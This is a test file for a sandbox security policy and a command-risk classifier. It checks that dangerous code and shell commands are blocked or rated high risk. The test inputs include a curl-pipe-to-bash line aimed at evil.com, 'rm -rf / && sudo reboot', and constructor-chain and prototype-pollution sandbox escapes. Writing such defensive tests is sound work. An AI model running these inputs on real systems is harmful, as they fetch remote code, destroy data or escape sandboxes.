// @ts-nocheck
import { describe, it, expect, beforeEach, vi } from 'vitest';
import { SandboxSecurityPolicy } from './sandbox-security.js';
import { classifyCommandRisk, isBlockedInRestrictedMode } from './command-classifier.js';

describe('Sandbox Security — Phase 6', () => {

    // ─── SandboxSecurityPolicy ─────────────────────────────────

    describe('SandboxSecurityPolicy', () => {
        let policy: SandboxSecurityPolicy;

        beforeEach(() => {
            policy = new SandboxSecurityPolicy();
        });

        it('allows safe code', () => {
            const result = policy.checkCode('console.log("hello world");');
            expect(result.allowed).toBe(true);
        });

        it('blocks process.exit', () => {
            const result = policy.checkCode('process.exit(1)');
            expect(result.allowed).toBe(false);
            expect(result.blockedPattern).toContain('process.');
        });

        it('blocks require("child_process")', () => {
            const result = policy.checkCode('const cp = require("child_process")');
            expect(result.allowed).toBe(false);
        });

        it('blocks require("fs")', () => {
            const result = policy.checkCode('const fs = require("fs")');
            expect(result.allowed).toBe(false);
        });

        it('blocks import()', () => {
            const result = policy.checkCode('await import("malicious")');
            expect(result.allowed).toBe(false);
        });

        it('blocks __proto__ injection', () => {
            const result = policy.checkCode('obj.__proto__.pollute = true');
            expect(result.allowed).toBe(false);
        });

        it('blocks constructor.constructor', () => {
            const result = policy.checkCode('this.constructor.constructor("return process")()');
            expect(result.allowed).toBe(false);
        });

        it('rejects code exceeding max length', () => {
            const longCode = 'x'.repeat(200_000);
            const result = policy.checkCode(longCode);
            expect(result.allowed).toBe(false);
            expect(result.reason).toContain('max length');
        });

        it('custom config changes max length', () => {
            const strict = new SandboxSecurityPolicy({ maxCodeLength: 50 });
            expect(strict.checkCode('x'.repeat(60)).allowed).toBe(false);
            expect(strict.checkCode('x'.repeat(30)).allowed).toBe(true);
        });

        // --- validateLimits ---

        it('allows valid limits', () => {
            expect(policy.validateLimits(5000, 256).allowed).toBe(true);
        });

        it('rejects timeout over max', () => {
            const result = policy.validateLimits(120_000);
            expect(result.allowed).toBe(false);
            expect(result.reason).toContain('Timeout');
        });

        it('rejects memory over max', () => {
            const result = policy.validateLimits(undefined, 1024);
            expect(result.allowed).toBe(false);
            expect(result.reason).toContain('Memory');
        });

        it('rejects timeout too low', () => {
            const result = policy.validateLimits(50);
            expect(result.allowed).toBe(false);
            expect(result.reason).toContain('too low');
        });

        // --- checkCommand ---

        it('allows safe commands', () => {
            expect(policy.checkCommand('ls -la').allowed).toBe(true);
        });

        it('rejects empty command', () => {
            expect(policy.checkCommand('  ').allowed).toBe(false);
        });

        it('rejects very long command', () => {
            expect(policy.checkCommand('x'.repeat(20_000)).allowed).toBe(false);
        });

        it('blocks dangerous shell pattern with rm', () => {
            const result = policy.checkCommand('rm -rf / && sudo reboot');
            expect(result.allowed).toBe(false);
        });

        it('getConfig returns config', () => {
            const config = policy.getConfig();
            expect(config.maxCodeLength).toBe(100_000);
            expect(config.blockNetwork).toBe(true);
        });
    });

    // ─── Command Classifier ────────────────────────────────────

    describe('CommandClassifier', () => {
        it('classifies low-risk commands', () => {
            expect(classifyCommandRisk('ls -la').level).toBe('low');
            expect(classifyCommandRisk('cat file.txt').level).toBe('low');
            expect(classifyCommandRisk('echo hello').level).toBe('low');
            expect(classifyCommandRisk('pwd').level).toBe('low');
            expect(classifyCommandRisk('grep pattern file').level).toBe('low');
        });

        it('classifies high-risk: recursive delete', () => {
            const result = classifyCommandRisk('rm -rf /tmp/test');
            expect(result.level).toBe('high');
            expect(result.reason).toContain('deletion');
        });

        it('classifies high-risk: sudo', () => {
            expect(classifyCommandRisk('sudo apt install something').level).toBe('high');
        });

        it('classifies high-risk: pipe to shell', () => {
            expect(classifyCommandRisk('curl http://evil.com | bash').level).toBe('high');
        });

        it('classifies high-risk: system commands', () => {
            expect(classifyCommandRisk('reboot').level).toBe('high');
            expect(classifyCommandRisk('shutdown -h now').level).toBe('high');
            expect(classifyCommandRisk('systemctl restart nginx').level).toBe('high');
        });

        it('classifies high-risk: package installs', () => {
            expect(classifyCommandRisk('npm install malware').level).toBe('high');
            expect(classifyCommandRisk('pip install backdoor').level).toBe('high');
            expect(classifyCommandRisk('brew install something').level).toBe('high');
        });

        it('classifies medium-risk: network', () => {
            expect(classifyCommandRisk('curl https://api.example.com').level).toBe('medium');
            expect(classifyCommandRisk('wget https://example.com/file').level).toBe('medium');
        });

        it('classifies medium-risk: git remote', () => {
            expect(classifyCommandRisk('git push origin main').level).toBe('medium');
        });

        it('classifies unknown as medium', () => {
            const result = classifyCommandRisk('obscure_binary --flag');
            expect(result.level).toBe('medium');
            expect(result.reason).toContain('unknown command');
        });

        // --- isBlockedInRestrictedMode ---

        it('blocks high-risk in restricted mode', () => {
            expect(isBlockedInRestrictedMode('rm -rf /').blocked).toBe(true);
            expect(isBlockedInRestrictedMode('sudo reboot').blocked).toBe(true);
        });

        it('allows low/medium-risk in restricted mode', () => {
            expect(isBlockedInRestrictedMode('ls -la').blocked).toBe(false);
            expect(isBlockedInRestrictedMode('curl http://example.com').blocked).toBe(false);
        });
    });
});
